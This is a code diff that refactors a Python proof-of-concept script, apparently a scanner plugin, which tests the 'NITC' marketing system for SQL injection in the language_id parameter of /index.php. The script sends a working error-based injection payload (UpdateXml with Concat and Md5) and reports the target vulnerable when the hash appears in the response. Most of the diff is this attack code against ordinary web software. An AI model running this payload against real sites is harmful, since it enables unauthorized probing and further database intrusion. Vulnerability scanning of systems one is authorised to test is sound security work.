@@ -9,20 +9,13 @@ description: 文件/index.php中,参数language_id存在SQL注入。
 import sys
 import requests
 import warnings
-  
-
-
-class index_language_id_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['NITC营销系统index.php SQL注入','','']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/index.php?language_id=1%20Or%20UpDateXml(1,CoNcAt(0x5c,Md5(1234)),1)%23--&is_protect=1&action=test"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed05" in req.text:
@@ -37,5 +30,4 @@ class index_language_id_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = index_language_id_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
